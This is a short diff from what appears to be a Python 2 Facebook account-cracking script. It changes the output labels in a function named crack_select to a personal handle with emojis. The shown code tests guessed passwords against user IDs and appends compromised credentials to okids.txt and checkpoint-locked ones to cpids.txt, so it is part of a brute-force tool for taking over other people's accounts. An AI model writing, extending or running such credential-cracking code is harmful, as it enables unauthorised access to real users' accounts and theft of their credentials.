@@ -682,7 +682,7 @@ def crack_select():
 
             if 'access_token' in q:
 
-                print '\x1b[1;32m[NAME-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\x1b[1;32m[M-ULLAH-OK😎]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
 
                 ok = open('okids.txt', 'a')
 
@@ -694,7 +694,7 @@ def crack_select():
 
             elif 'www.facebook.com' in q['error_msg']:
 
-                print '\x1b[1;31m[NAME-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\x1b[1;31m[M-ULLAH-CP🤦🏻‍♀️] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
 
                 cp = open('cpids.txt', 'a')
 
@@ -714,7 +714,7 @@ def crack_select():
 
                 if 'access_token' in q:
 
-                    print '\x1b[1;32m[OK]\033[0m ' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print '\x1b[1;32m[M-ULLAH-OK😎]\033[0m ' + uid + ' | ' + pass2 + '\x1b[0;97m'
 
                     ok = open('okids.txt', 'a')
 
@@ -726,7 +726,7 @@ def crack_select():
 
                 elif 'www.facebook.com' in q['error_msg']:
 
-                    print '\x1b[1;31m[NAME-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print '\x1b[1;31m[M-ULLAH-CP🤦🏻‍♀️] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
 
                     cp = open('cpids.txt', 'a')
 
